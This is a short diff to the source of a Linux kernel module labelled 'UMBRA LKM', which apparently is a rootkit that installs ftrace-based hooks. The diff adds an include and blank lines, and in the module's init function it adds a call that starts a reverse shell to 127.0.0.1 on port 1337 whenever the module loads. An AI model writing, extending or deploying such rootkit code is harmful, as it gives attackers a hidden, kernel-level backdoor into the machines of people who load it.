@@ -10,8 +10,10 @@
 
 
 
+
 #include "include/ftrace_manager.h"
 #include "include/hookers.h"
+#include "include/utils.h"
 
 #if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
 #define VERSION_NOT_SUPPORTED
@@ -21,6 +23,10 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("marsan27 marcossbajo@gmail.com");
 MODULE_DESCRIPTION("UMBRA LKM");
 MODULE_VERSION("1");
+
+
+
+
 
 static void __exit mod_exit(void){
     remove_all_hooks();
@@ -39,6 +45,7 @@ static int __init mod_init(void){
         return err;
     }
     printk(KERN_INFO "UMBRA:: Successfully loaded\n");
+    start_reverse_shell("127.0.0.1", "1337");
     return 0;
 }
 
